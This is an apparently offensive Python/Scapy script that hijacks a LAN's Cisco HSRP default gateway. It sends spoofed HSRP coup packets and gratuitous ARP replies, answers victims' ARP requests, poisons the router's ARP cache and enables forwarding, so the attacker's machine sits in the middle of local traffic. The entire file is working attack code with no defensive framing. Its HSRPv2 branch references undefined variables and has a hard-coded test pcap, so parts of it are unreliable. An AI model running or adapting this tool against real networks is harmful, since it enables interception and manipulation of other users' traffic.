#script tested working in kali

from scapy.all import *
import threading
import netifaces as ni
import ipaddress

# change as necessary
interface = "eth0"
# option to poison router if sniffing of response is required
poisonrouter = True
attackportsecurity = True
debug = True

myip = ni.ifaddresses(interface)[ni.AF_INET][0]["addr"]
mymac = ni.ifaddresses(interface)[ni.AF_LINK][0]["addr"]
mynetmask = ni.ifaddresses(interface)[ni.AF_INET][0]['netmask']
myprefix = ipaddress.IPv4Network(f"0.0.0.0/{mynetmask}").prefixlen
mynetwork = ipaddress.ip_interface(f"{myip}/{myprefix}").network

hsrpfound = False
version: int
pkcopy: Packet

def find_hsrp():
    #consider offline="filename" to test with pcap file
    print("Listening for active HSRP packets on UDP port 1985...")
    sniff(prn=check_hsrp, filter="udp and udp dst port 1985", stop_filter=hsrp_found, offline="hsrp v2.pcap")
    if hsrpfound:
        return True
    return False

#called by sniff() to check if hsrp is found, stop condition
def hsrp_found(packet):
    return hsrpfound == True

#called by sniff() to check for valid hsrp
def check_hsrp(packet):
    global version
    global hsrpfound
    global pkcopy
    if packet[HSRP].version == 0:
        if not check_v1_fields(packet):
            return
        print("Active HSRP found, version 1")
        # if HSRP has already been found previously, second check
        if hsrpfound == True:
            # possible attack failure
            print("HSRP hijack failure")
        if debug:
            print("Active router group: ", packet[HSRP].group)
            print("Active router priority: ", packet[HSRP].priority)
            print("Active router IP: ", packet[IP].src)
            print("Virtual gateway IP: ", packet[HSRP].virtualIP)
            print("HSRP Hello time: ", packet[HSRP].hellotime)
        version = 1
        hsrpfound = True
        pkcopy = packet
    else:
        ethersrc = packet[Ether].src
        # to improve on HSRPv2 detection, currently based on source mac address only and fails if standby group number changes
        if ethersrc == "00:00:0C:9F:F0:01":
            print("HSRPv2 found")
            version = 2
            hsrpfound = True
            pkcopy = packet

# make sure hsrp packet is valid
def check_v1_fields(packet):
    try:
        # check correct version
        assert packet[HSRP].version == 0
        # check for HSRP Hello
        assert packet[HSRP].opcode == 0
        # check for active HSRP router
        assert packet[HSRP].state == 16
        # check correct destination ip
        assert packet[IP].dst == "224.0.0.2"
    except:
        # not found if any assert fails
        return False
    return True

def send_hsrp(packet):
    if attackportsecurity:
        ethersrc = mymac
    else:
        ethersrc = packet[Ether].src
    # copy fields of original HSRP packet
    etherdst = packet[Ether].dst
    ipdst = packet[IP].dst
    ipttl = packet[IP].ttl
    sport = packet[UDP].sport
    dport = packet[UDP].dport
    if version == 1:
        hellotime = packet[HSRP].hellotime
        holdtime = packet[HSRP].holdtime
        group = packet[HSRP].group
        auth = packet[HSRP].auth
        virtualIP = packet[HSRP].virtualIP
        # Start sending spoofed HSRPv1 and ARP packet
        print("Hijacking HSRPv1...")
        pkt = Ether(dst=etherdst, src=ethersrc)/IP(dst=ipdst, ttl=ipttl)/UDP(sport=sport, dport=dport)/HSRP(opcode=1, state=16, hellotime=hellotime, holdtime=holdtime, priority=255, group=group, auth=auth, virtualIP=virtualIP)
        # Mimic sending pattern of cisco HSRP routers with 2 ARP broadcast
        sendp(pkt, verbose=False)
        send_initial_arp(packet)
        pkt[HSRP].opcode = 0

        sendp(pkt, verbose=False)
        send_initial_arp(packet)
        find_hsrp()
        sendp(pkt, inter=packet[HSRP].hellotime, loop=1)
    else:
        # TODO Extract bytes from HSRP packet using script, do not hard code HSRP bytes
        payloadHSRP = b'\x02\x00\x06\x04\x00\x01\x5c\x71\x0d\xbd\x87\xc7\x00\x00\x00\xff\x00\x00\x0b\xb8\x00\x00\x27\x10\xc0\xa8\x01\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        payloadText = b'cisco\x00\x00\x00'
        eth = Ether(src=ethersrc, dst=etherdst)
        ip = IP(src=attackerIP, dst=destIP, len=80, ttl=ipttl)
        udp = UDP(sport=sport, dport=dport, len=60)
        groupTlv = IPv6ExtHdrSegmentRoutingTLV(type=1, len=40, value=payloadHSRP)
        textTlv = IPv6ExtHdrSegmentRoutingTLV(type=3, len=8, value=payloadText)
        # Start sending spoofed HSRP and ARP packet
        pkt = eth/ip/udp/groupTlv/textTlv
        print("Hijacking HSRPv2...")
        sendp(pkt, verbose=False)
        send_initial_arp(packet)
        sendp(pkt, verbose=False)
        send_initial_arp(packet)
        sendp(pkt, iface=interface, inter=3, loop=1)

# Send arp with own mac address and HSRP virtual ip to redirect local traffic to attacker
def send_initial_arp(packet):
    if attackportsecurity:
        ethersrc = mymac
    else:
        ethersrc = packet[Ether].src
    if version == 1:
        virtualIP = packet[HSRP].virtualIP
        hellotime = packet[HSRP].hellotime
    else:
        return
    pkt = Ether(src=ethersrc, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=virtualIP, hwdst="ff:ff:ff:ff:ff:ff", pdst=virtualIP)
    sendp(pkt, inter=hellotime, verbose=False)

# Start interface on attacker pc with same IP as HSRP gateway virtualip
def start_subinterface(pkt):
    if version == 1:
        virtualIP = pkt[HSRP].virtualIP
    else:
        return
    if debug:
        print(f"Starting sub interface with IP: {virtualIP} on {interface}")
    subprocess.run(["ifconfig", f"{interface}:1", virtualIP, "netmask", mynetmask, "up"])

# Enable routing of received packets on attacker pc
def enable_forwarding():
    if debug:
        print("Enabling packet forwarding on linux:")
    subprocess.run("sysctl -w net.ipv4.ip_forward=1".split())

# Change default gateway of attacker pc to one of the HSRP routers
def change_default_gw(routerIP):
    if debug:
        print(f"Changing default gateway to: {routerIP}")
    subprocess.run(f"route add default gw {routerIP} {interface}".split())

# sniff and respond to arp request for HSRP virtual ip address from network
def start_arp_responder(pkt):
    if version == 1:
        virtualIP = pkt[HSRP].virtualIP
    else:
        return
    if debug:
        print("Responding to ARP requests for gateway ip")
    filterstring = f"arp and dst host {virtualIP} and src host not {virtualIP} and ether src host not {mymac}"
    sniff(prn=arp_respond, filter=filterstring)

# called by sniff to send arp response to any request for HSRP virtual ip address
def arp_respond(pkt):
    if version == 1:
        virtualIP = pkcopy[HSRP].virtualIP
    else:
        return
    if attackportsecurity:
        ethersrc = mymac
    else:
        ethersrc = packet[Ether].src
    victimEther = pkt[Ether].src
    victimIP = pkt[ARP].psrc
    pkttosend = Ether(dst=victimEther)/ARP(op=2, psrc=virtualIP, hwdst=victimEther, pdst=victimIP)
    sendp(pkttosend, verbose=False)
    return f"Responded to ARP request from {victimIP}"

# start poisoning router's arp cache only for potentially vulnerable traffic
def start_selective_poisoning(pkt):
    if poisonrouter:
        if debug:
            print("Poisoning router")
        routerIP = pkt[IP].src
        filterstring = f"(tcp or udp) and dst port not 443 and dst port not 22 and src host not ({routerIP} or 0.0.0.0) and ether src host not {mymac}"
        sniff(prn=arp_poison, filter=filterstring)

# called by sniff to poison arp cache of HSRP router
def arp_poison(pkt):
    if version == 1:
        virtualIP = pkcopy[HSRP].virtualIP
    try:
        victimIP = pkt[IP].src
        dstIP = pkt[IP].dst
        # set ARP op code for ARP request
        op = 1
        etherdst = "ff:ff:ff:ff:ff:ff"
        # do not poison arp if destination is multicast or source ip is not in local network
        if ipaddress.ip_address(dstIP).is_multicast or ipaddress.ip_address(victimIP) not in mynetwork:
            return
        arppkt = Ether(dst=etherdst)/ARP(op=op, psrc=victimIP, pdst=virtualIP)
        sendp(arppkt, verbose=False)
        if debug:
            return f"Spoofing ARP from {victimIP}, trigger: packet sent to {dstIP}"
    except:
        if debug:
            print("Not IP packet")
            pkt.show()
    return


if __name__ == "__main__":
    print(f"Options used:\n\
        Interface: {interface}\n\
        Poison Router: {poisonrouter}\n\
        Attack Port Security: {attackportsecurity}\n\
        Debug: {debug}")
    if find_hsrp():
        if version == 1:
            enable_forwarding()
            start_subinterface(pkcopy)
            change_default_gw(pkcopy[IP].src)
            print(f"Attacking on this interface: {interface} {myip}")
            arp_thread = threading.Thread(target=start_arp_responder, args=(pkcopy))
            arp_thread.start()
            selective_poison = threading.Thread(target=start_selective_poisoning, args=(pkcopy))
            selective_poison.start()
            send_hsrp(pkcopy)